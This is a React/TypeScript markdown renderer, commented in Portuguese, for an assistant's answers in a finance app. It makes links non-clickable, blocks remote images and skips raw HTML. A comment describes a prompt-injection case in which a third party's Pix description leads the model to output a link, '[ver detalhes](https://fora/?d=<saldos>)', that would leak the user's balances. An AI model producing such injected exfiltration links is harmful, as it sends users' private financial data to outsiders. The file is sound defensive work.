import { Children, isValidElement, memo, type ReactNode, useRef } from 'react';
import ReactMarkdown, { type Components, defaultUrlTransform, type UrlTransform } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { BotaoCopiar } from './comum';
import { BlocoGrafico } from './relatorio/BlocoGrafico';
import { anexoDaFonte, ImagemDaResposta } from './relatorio/ImagemDaResposta';

const linguagemDe = (children: ReactNode) =>
  /language-([\w-]+)/.exec((children as { props?: { className?: string } } | undefined)?.props?.className ?? '')?.[1] ?? 'texto';

/** Bloco de código com cabeçalho (linguagem) e botão de copiar. */
function BlocoCodigo({ children }: { children?: ReactNode }) {
  const ref = useRef<HTMLPreElement>(null);
  const linguagem = linguagemDe(children);
  return (
    <div className="md__codigo">
      <div className="md__codigo-topo">
        <span>{linguagem}</span>
        <BotaoCopiar texto={() => ref.current?.textContent ?? ''} rotulo="Copiar código" comTexto />
      </div>
      <pre ref={ref}>{children}</pre>
    </div>
  );
}

/** O texto puro de um trecho renderizado (para saber se o rótulo já é a própria URL). */
function textoDe(no: ReactNode): string {
  return Children.toArray(no)
    .map((filho) => {
      if (typeof filho === 'string' || typeof filho === 'number') return String(filho);
      if (isValidElement<{ children?: ReactNode }>(filho)) return textoDe(filho.props.children);
      return '';
    })
    .join('');
}

/** Link automático do GFM: o rótulo é a própria URL (com ou sem o esquema que o GFM completa). */
function rotuloEhAUrl(rotulo: string, url: string): boolean {
  return [rotulo, `mailto:${rotulo}`, `http://${rotulo}`, `https://${rotulo}`].includes(url);
}

/**
 * Nenhum link da resposta é clicável. O texto pode ter sido montado por quem escreveu
 * uma descrição de Pix (prompt injection): um `[ver detalhes](https://fora/?d=<saldos>)`
 * vazaria dados num clique. Fica o rótulo e, ao lado, a URL inteira à vista, como texto.
 */
function LinkComoTexto({ href, children }: { href?: string; children?: ReactNode }) {
  const url = href?.trim() ?? '';
  const rotulo = textoDe(children).trim();
  if (!url) return <span className="md__link-texto">{children}</span>;
  if (rotuloEhAUrl(rotulo, url)) return <code className="md__url">{rotulo}</code>;
  return (
    <span className="md__link-texto">
      {children} (<code className="md__url">{url}</code>)
    </span>
  );
}

/** Imagem só de anexo desta conversa (`anexo:<uuid>`); qualquer outra fonte vira texto. */
function Imagem({ src, alt }: { src?: unknown; alt?: string }) {
  const id = typeof src === 'string' ? anexoDaFonte(src) : null;
  if (id) return <ImagemDaResposta id={id} alt={alt ?? ''} />;
  return <span className="md__sem-imagem">[imagem{alt ? `: ${alt}` : ''}]</span>;
}

/** ```grafico vira gráfico do Fluxo; o resto, bloco de código. */
function criarComponentes(gerando: boolean): Components {
  return {
    a: ({ href, children }) => <LinkComoTexto href={href}>{children}</LinkComoTexto>,
    pre: ({ children }) =>
      linguagemDe(children) === 'grafico' ? <BlocoGrafico codigo={textoDe(children)} gerando={gerando} /> : <BlocoCodigo>{children}</BlocoCodigo>,
    table: ({ children }) => (
      <div className="md__tabela">
        <table>{children}</table>
      </div>
    ),
    img: ({ src, alt }) => <Imagem src={src} alt={alt} />,
  };
}

const COMPONENTES = criarComponentes(false);
const COMPONENTES_GERANDO = criarComponentes(true);

/**
 * O react-markdown apaga esquemas que não conhece; `anexo:` passa só como fonte
 * de imagem, e só no formato exato. Links continuam pelo filtro padrão.
 */
const transformarUrl: UrlTransform = (url, chave) => (chave === 'src' && anexoDaFonte(url) ? url.trim() : defaultUrlTransform(url));

const PLUGINS = [remarkGfm];

/**
 * Markdown da resposta. Sem rehype-raw: HTML no texto não vira HTML (o texto pode
 * ecoar descrições de Pix, que são de terceiros). Imagens remotas não carregam e
 * links não são clicáveis — os dois seriam jeitos de vazar dados para fora. As
 * únicas imagens são anexos desta conversa (`anexo:<uuid>`, servidos pelo Fluxo),
 * e blocos ```grafico viram gráficos desenhados aqui, com os números do bloco.
 */
export const Markdown = memo(function Markdown({ texto, gerando = false }: { texto: string; gerando?: boolean }) {
  return (
    <div className={`md ${gerando ? 'md--gerando' : ''}`}>
      <ReactMarkdown remarkPlugins={PLUGINS} components={gerando ? COMPONENTES_GERANDO : COMPONENTES} urlTransform={transformarUrl} skipHtml>
        {texto}
      </ReactMarkdown>
    </div>
  );
});
